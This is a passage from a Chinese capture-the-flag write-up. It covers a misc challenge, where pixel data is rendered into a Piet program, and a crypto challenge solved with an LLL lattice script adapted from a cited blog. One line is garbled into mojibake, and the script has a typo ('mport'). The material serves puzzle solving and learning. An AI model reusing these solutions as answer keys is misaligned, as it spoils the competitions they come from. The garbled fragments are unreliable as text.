,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,12,12,12,12,12,12,12,12,2,2,2,0,12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0 ,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,12,0,5,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12 ,12,5,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,12,0,0, 12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,0,0,05. ᪒ڊ๶Ӟୟࢶᇆ҅ฎ piet ҅ፗളࣁᕚᥴ҅ᦕ஑೯դቘ ᥴᎱ࣎ࣈғhttps://www.bertnase.de/npiet/npiet-execute.php ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0] i=0 for j in range(37): for n in range(191): pic.putpixel((int(j),int(n)),color[s[i]]) i += 1 pic.save('decode.png'

跑出来是一个图片piet，可以下在线解，给网站：https://www.bertnase.de/npiet/npiet-execute.php，解码后就是flag。

## crypto1

原题，改下参数就行，附上网址https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/

再附上脚本：

mport math
from decimal import *
import random
import struct

getcontext().prec = int(100)

primes = [2]
for i in range(3, 100):
  f = True
  for j in primes:
    if i * i < j:
      break
    if i % j == 0:
      f = False
      break
  if f:
    primes.append(i)

keys = []
for i in range(len(primes)):
  keys.append(Decimal(int(primes[i])).ln())

arr = []
for v in keys:
  arr.append(int(v * int(16) ** int(64)))

ct = 737384863737803670841307970259513146291422299366557325168325233349136771464845311

def encrypt(res):
  h = Decimal(int(0))
  for i in range(len(keys)):
    h += res[i] * keys[i]

  ct = int(h * int(16)**int(64))
  return ct

def f(N):
  ln = len(arr)
  A = Matrix(ZZ, ln + 1, ln + 1)
  for i in range(ln):
    A[i, i] = 1
    A[i, ln] = arr[i] // N
    A[ln, i] = 64

  A[ln, ln] = ct // N

  res = A.LLL()

  for i in range(ln + 1):
    flag = True
    for j in range(ln):
      if -64 <= res[i][j] < 64:
        continue
      flag = False
      break
    if flag:
      vec = [int(v + 64) for v in res[i][:-1]]
      ret = encrypt(vec)
      if ret == ct:
        print(N, bytes(vec))
      else:
        print("NO", ret, bytes(vec))

for i in range(2, 10000):
  print(i)
  f(i)

## crypto2

也是原题。。直接谷歌即可得。





### 总的来说这次红帽杯能做的都做了，算是不后悔，多学。